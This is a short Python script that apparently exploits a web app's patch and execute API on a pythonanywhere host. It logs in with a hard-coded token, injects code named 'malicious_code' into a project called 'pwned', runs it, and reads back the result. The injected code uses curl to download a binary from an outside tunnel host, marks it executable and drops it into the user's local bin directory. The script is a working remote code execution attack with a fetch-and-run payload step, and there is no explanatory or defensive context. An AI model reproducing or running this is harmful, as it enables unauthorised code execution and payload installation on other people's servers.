import requests
import time

s = requests.Session()
s.post('https://mikeymike.pythonanywhere.com/login', data={'token': 'Mike'})

malicious_code = """
import os, subprocess
try:
    os.makedirs("/home/MikeyMike/.local/bin", exist_ok=True)
    subprocess.run("curl -L -o /home/MikeyMike/.local/bin/agy https://afa5637244d226.lhr.life/agy", shell=True)
    subprocess.run("chmod +x /home/MikeyMike/.local/bin/agy", shell=True)
    with open("out10.txt", "w") as f:
        f.write("Downloaded successfully!")
except Exception as e:
    with open("out10.txt", "w") as f:
        f.write(str(e))
"""

s.post('https://mikeymike.pythonanywhere.com/api/projects/surgery_logic/apply_patch', json={"project": "pwned", "file": "main.py", "code": malicious_code})
s.get('https://mikeymike.pythonanywhere.com/api/projects/execute/pwned')
time.sleep(40)
r3 = s.get('https://mikeymike.pythonanywhere.com/api/projects/surgery_logic/get_raw_file?project=pwned&file=out10.txt')
print(r3.text)
